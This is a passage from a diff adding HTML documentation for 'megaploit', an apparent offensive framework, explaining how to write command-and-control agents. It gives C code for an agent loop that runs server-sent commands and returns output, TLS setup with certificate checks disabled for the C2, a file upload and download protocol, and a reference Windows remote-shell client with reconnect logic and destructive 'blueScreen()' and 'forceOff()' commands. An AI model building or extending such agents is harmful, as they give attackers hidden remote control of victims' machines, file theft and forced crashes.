+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a><span class="w">    </span><span class="cm">/* Step 2: Protocol version handshake */</span>
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a><span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">ver</span><span class="p">;</span>
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a><span class="w">    </span><span class="n">mp_recv_exactly</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ver</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a><span class="w">    </span><span class="n">send</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ver</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w">   </span><span class="cm">/* echo back exactly as received */</span>
+</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">use_v2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ver</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">MP_V2_MAGIC</span><span class="p">);</span>
+</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>
+</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a><span class="w">    </span><span class="cm">/* Step 3: Initialise connection state */</span>
+</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a><span class="w">    </span><span class="n">mp_conn_t</span><span class="w"> </span><span class="n">conn</span><span class="p">;</span>
+</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a><span class="w">    </span><span class="n">mp_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">use_v2</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">);</span>
+</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a>
+</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a><span class="w">    </span><span class="cm">/* Step 4: Command loop */</span>
+</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a><span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mp_recv_msg</span><span class="p">(</span><span class="o">&amp;</span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">cmd</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">MP_OK</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
+</span><span id="__span-8-31"><a id="__codelineno-8-31" name="__codelineno-8-31" href="#__codelineno-8-31"></a>
+</span><span id="__span-8-32"><a id="__codelineno-8-32" name="__codelineno-8-32" href="#__codelineno-8-32"></a><span class="w">        </span><span class="cm">/* Execute cmd and produce output */</span>
+</span><span id="__span-8-33"><a id="__codelineno-8-33" name="__codelineno-8-33" href="#__codelineno-8-33"></a><span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="n">output</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+</span><span id="__span-8-34"><a id="__codelineno-8-34" name="__codelineno-8-34" href="#__codelineno-8-34"></a><span class="w">        </span><span class="n">run_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="n">output</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">output</span><span class="p">));</span>
+</span><span id="__span-8-35"><a id="__codelineno-8-35" name="__codelineno-8-35" href="#__codelineno-8-35"></a><span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+</span><span id="__span-8-36"><a id="__codelineno-8-36" name="__codelineno-8-36" href="#__codelineno-8-36"></a>
+</span><span id="__span-8-37"><a id="__codelineno-8-37" name="__codelineno-8-37" href="#__codelineno-8-37"></a><span class="w">        </span><span class="cm">/* Response: JSON string (quoted, internal quotes escaped) */</span>
+</span><span id="__span-8-38"><a id="__codelineno-8-38" name="__codelineno-8-38" href="#__codelineno-8-38"></a><span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="n">response_json</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">output</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="p">];</span>
+</span><span id="__span-8-39"><a id="__codelineno-8-39" name="__codelineno-8-39" href="#__codelineno-8-39"></a><span class="w">        </span><span class="n">snprintf</span><span class="p">(</span><span class="n">response_json</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">response_json</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">output</span><span class="p">);</span>
+</span><span id="__span-8-40"><a id="__codelineno-8-40" name="__codelineno-8-40" href="#__codelineno-8-40"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mp_send_msg</span><span class="p">(</span><span class="o">&amp;</span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="n">response_json</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">MP_OK</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
+</span><span id="__span-8-41"><a id="__codelineno-8-41" name="__codelineno-8-41" href="#__codelineno-8-41"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-8-42"><a id="__codelineno-8-42" name="__codelineno-8-42" href="#__codelineno-8-42"></a>
+</span><span id="__span-8-43"><a id="__codelineno-8-43" name="__codelineno-8-43" href="#__codelineno-8-43"></a><span class="w">    </span><span class="n">MP_CLOSE</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span><span id="__span-8-44"><a id="__codelineno-8-44" name="__codelineno-8-44" href="#__codelineno-8-44"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+</span><span id="__span-8-45"><a id="__codelineno-8-45" name="__codelineno-8-45" href="#__codelineno-8-45"></a><span class="p">}</span>
+</span></code></pre></div>
+<h3 id="32-tls-wrapping-recommended">3.2 TLS wrapping (recommended)<a class="headerlink" href="#32-tls-wrapping-recommended" title="Permanent link">&para;</a></h3>
+<p>The server expects TLS when started with <code>--cert</code>/<code>--key</code>. For Windows agents
+use SChannel (see the C-remote-shell reference implementation). For Linux/macOS
+agents use OpenSSL:</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;openssl/ssl.h&gt;</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="cm">/* Create SSL_CTX with TLS_client_method(), disable old protocols,</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="cm"> * set SSL_OP_NO_RENEGOTIATION, then SSL_connect().</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="cm"> * Use SSL_read/SSL_write instead of recv/send. */</span>
+</span></code></pre></div>
+<p>Buffer sizing for TLS:</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="kt">uint8_t</span><span class="w"> </span><span class="n">record_buf</span><span class="p">[</span><span class="n">TLS_BUF_RECORD</span><span class="p">];</span><span class="w">         </span><span class="cm">/* 16 384 B — RFC 5246 max record */</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="kt">uint8_t</span><span class="w"> </span><span class="n">handshake_buf</span><span class="p">[</span><span class="n">TLS_BUF_SERVER_FLIGHT</span><span class="p">];</span><span class="w"> </span><span class="cm">/* 8 192 B — server hello flight */</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="kt">uint8_t</span><span class="w"> </span><span class="n">client_hello</span><span class="p">[</span><span class="n">TLS_BUF_CLIENT_HELLO</span><span class="p">];</span><span class="w"> </span><span class="cm">/*  1 024 B — ClientHello         */</span>
+</span></code></pre></div>
+<h3 id="33-json-encoding-rules">3.3 JSON encoding rules<a class="headerlink" href="#33-json-encoding-rules" title="Permanent link">&para;</a></h3>
+<p>The server's <code>recv_msg()</code> calls <code>json.loads()</code> on the payload. Your response
+<strong>must</strong> be a JSON string literal:</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="cm">/* Correct */</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="n">mp_send_msg</span><span class="p">(</span><span class="o">&amp;</span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">hello world</span><span class="se">\&quot;</span><span class="s">&quot;</span><span class="p">);</span><span class="w">    </span><span class="cm">/* JSON string */</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="cm">/* Wrong — server will raise json.JSONDecodeError and drop the message */</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="n">mp_send_msg</span><span class="p">(</span><span class="o">&amp;</span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;hello world&quot;</span><span class="p">);</span><span class="w">        </span><span class="cm">/* raw text, not JSON */</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="n">mp_send_msg</span><span class="p">(</span><span class="o">&amp;</span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;{</span><span class="se">\&quot;</span><span class="s">key</span><span class="se">\&quot;</span><span class="s">:</span><span class="se">\&quot;</span><span class="s">val</span><span class="se">\&quot;</span><span class="s">}&quot;</span><span class="p">);</span><span class="w">  </span><span class="cm">/* JSON object, not string */</span>
+</span></code></pre></div>
+<p>To produce a safe JSON string from C output, escape backslashes and
+double-quotes:</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">json_quote</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">cap</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">    </span><span class="n">out</span><span class="p">[</span><span class="n">o</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;&quot;&#39;</span><span class="p">;</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">in</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">cap</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">in</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;&quot;&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">in</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;\\&#39;</span><span class="p">)</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="w">            </span><span class="n">out</span><span class="p">[</span><span class="n">o</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\\&#39;</span><span class="p">;</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="w">        </span><span class="n">out</span><span class="p">[</span><span class="n">o</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">];</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="w">    </span><span class="n">out</span><span class="p">[</span><span class="n">o</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;&quot;&#39;</span><span class="p">;</span>
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="w">    </span><span class="n">out</span><span class="p">[</span><span class="n">o</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="p">}</span>
+</span></code></pre></div>
+<h3 id="34-file-transfer-protocol">3.4 File transfer protocol<a class="headerlink" href="#34-file-transfer-protocol" title="Permanent link">&para;</a></h3>
+<p>The server sends <code>"download &lt;path&gt;"</code> or <code>"upload &lt;name&gt;"</code> as the command
+string. The expected exchange mirrors <code>megaploit/agent/handlers.py</code>:</p>
+<p><strong>Download (agent → server)</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>server sends:   &quot;download /path/to/file&quot;
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>agent replies:  &quot;FILE_OK&quot;          (if file exists)  -- or error string
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>agent sends:    &lt;framed file bytes&gt;                   -- same framing, no JSON
+</span></code></pre></div></p>
+<p><strong>Upload (server → agent)</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>server sends:   &quot;upload filename.bin&quot;
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>server sends:   &lt;framed file bytes&gt;
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>agent replies:  &quot;[+] Received: filename.bin&quot;
+</span></code></pre></div></p>
+<p>File frames use the same <code>[uint32-BE length][uint64-BE seq][raw bytes]</code> layout
+as message frames — the only difference is that the bytes after the seq prefix
+are raw binary, not JSON.</p>
+<hr />
+<h2 id="4-c-remote-shell-as-the-reference-agent">4. C-remote-shell as the Reference Agent<a class="headerlink" href="#4-c-remote-shell-as-the-reference-agent" title="Permanent link">&para;</a></h2>
+<p>The complete, production-quality C2 agent is in <a href="../C-remote-shell/"><code>C-remote-shell/</code></a>.
+Read it before writing your own agent — every protocol rule is implemented
+exactly as the Python server expects.</p>
+<h3 id="41-key-files-to-study">4.1 Key files to study<a class="headerlink" href="#41-key-files-to-study" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>What to learn from it</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="../C-remote-shell/tls/tls_client.c"><code>tls/tls_client.c</code></a></td>
+<td>Full SChannel TLS 1.2/1.3 + BCrypt AES-GCM + HMAC-SHA256</td>
+</tr>
+<tr>
+<td><a href="../C-remote-shell/tls/tls_client.h"><code>tls/tls_client.h</code></a></td>
+<td><code>TLS_CONTEXT</code> struct, the 4-function public API</td>
+</tr>
+<tr>
+<td><a href="../C-remote-shell/client/main.c"><code>client/main.c</code></a></td>
+<td>WinMain reconnect loop, key loading, <code>tls_connect()</code> sequence</td>
+</tr>
+<tr>
+<td><a href="../C-remote-shell/client/shell.c"><code>client/shell.c</code></a></td>
+<td><code>strncmp()</code> verb dispatch, <code>_popen()</code> fallback, file transfer</td>
+</tr>
+<tr>
+<td><a href="../C-remote-shell/client/config.h"><code>client/config.h</code></a></td>
+<td>All tuneable constants in one place</td>
+</tr>
+</tbody>
+</table>
+<h3 id="42-the-four-security-layers-in-order">4.2 The four security layers (in order)<a class="headerlink" href="#42-the-four-security-layers-in-order" title="Permanent link">&para;</a></h3>
+<p>Every connection goes through all four layers inside <code>tls_connect()</code> before
+any shell traffic flows:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>TCP socket
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>  └── Layer 1: SChannel TLS 1.2/1.3
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>        SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>        SCH_USE_STRONG_CRYPTO  (AEAD-only cipher suites)
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>        ISC_REQ_NO_RENEGOTIATION
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>        SCH_CRED_MANUAL_CRED_VALIDATION (cert check off — C2 is self-signed)
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>        |
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>        └── Layer 2: HMAC-SHA256 challenge/response
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>              server -&gt; 16-byte nonce
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>              client -&gt; HMAC-SHA256(key, nonce) = 32 bytes
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>              |
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>              └── Layer 3: Protocol v2 negotiation
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>                    server -&gt; 0x4D
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>                    client -&gt; 0x4D (echo)
+</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>                    |
+</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>                    └── Layer 4: AES-256-GCM framed messages
+</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>                          [uint32-BE len][nonce(12)][ct+tag(16)]
+</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>                          [uint64-BE seq][plaintext]
+</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a>                          monotonic seq, replay protection
+</span></code></pre></div>
+<h3 id="43-verb-dispatch-pattern">4.3 Verb dispatch pattern<a class="headerlink" href="#43-verb-dispatch-pattern" title="Permanent link">&para;</a></h3>
+<p>The C client uses <code>strncmp()</code> for all command matching. This pattern is
+<strong>the source of truth</strong> for <code>c_probe</code> verb extraction:</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="cm">/* Verb the server sends                strncmp match           handler */</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cbCmd</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">7</span><span class="w">  </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">strncmp</span><span class="p">(</span><span class="s">&quot;sysinfo&quot;</span><span class="p">,</span><span class="w">  </span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="mi">7</span><span class="p">)</span><span class="w">  </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">_handle_sysinfo</span><span class="p">(</span><span class="n">pTls</span><span class="p">);</span><span class="w">  </span><span class="k">continue</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cbCmd</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">3</span><span class="w">  </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">strncmp</span><span class="p">(</span><span class="s">&quot;cd &quot;</span><span class="p">,</span><span class="w">      </span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w">  </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">_handle_cd</span><span class="p">(</span><span class="n">pTls</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span><span class="w">  </span><span class="k">continue</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cbCmd</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">strncmp</span><span class="p">(</span><span class="s">&quot;forceOff()&quot;</span><span class="p">,</span><span class="n">cmd</span><span class="p">,</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="cm">/* NT power-off */</span><span class="w">       </span><span class="k">return</span><span class="p">;</span><span class="w">   </span><span class="p">}</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="cm">/* ... */</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="cm">/* Shell fallback — covers everything else */</span>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="n">_shell_exec</span><span class="p">(</span><span class="n">pTls</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">);</span>
+</span></code></pre></div>
+<p>See <a href="../C-remote-shell/client/shell.c"><code>client/shell.c</code></a> for the complete table.</p>
+<hr />
+<h2 id="5-c2-compliance-probe">5. C2 Compliance Probe<a class="headerlink" href="#5-c2-compliance-probe" title="Permanent link">&para;</a></h2>
+<p>Before the payload builder compiles the C-remote-shell client, it runs
+<code>megaploit/core/c_probe.py</code> against the source tree to verify the security
+standard. You can run it manually against your own agent:</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">megaploit.core.c_probe</span><span class="w"> </span><span class="kn">import</span> <span class="n">probe</span><span class="p">,</span> <span class="n">print_report</span><span class="p">,</span> <span class="n">extract_verbs</span><span class="p">,</span> <span class="n">c_exclusive_verbs</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="c1"># Full 46-signal compliance check (33 required)</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="n">result</span> <span class="o">=</span> <span class="n">probe</span><span class="p">(</span><span class="s2">&quot;C-remote-shell&quot;</span><span class="p">)</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="n">print_report</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="c1"># Summary: 33/33 required signals found  (46/46 total)</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="c1"># Verdict: [+] COMPLIANT</span>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a><span class="c1"># What commands does the C client handle?</span>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="nb">print</span><span class="p">(</span><span class="n">extract_verbs</span><span class="p">(</span><span class="s2">&quot;C-remote-shell&quot;</span><span class="p">))</span>
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a><span class="c1"># -&gt; [&#39;q&#39;, &#39;blueScreen()&#39;, &#39;forceOff()&#39;, &#39;exit&#39;, &#39;sysinfo&#39;, ...]</span>
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a><span class="c1"># Which verbs have no Python-agent counterpart?</span>
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a><span class="nb">print</span><span class="p">(</span><span class="n">c_exclusive_verbs</span><span class="p">(</span><span class="s2">&quot;C-remote-shell&quot;</span><span class="p">))</span>
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a><span class="c1"># -&gt; [&#39;blueScreen()&#39;, &#39;forceOff()&#39;]</span>
+</span></code></pre></div>
+<h3 id="51-signals-checked">5.1 Signals checked<a class="headerlink" href="#51-signals-checked" title="Permanent link">&para;</a></h3>
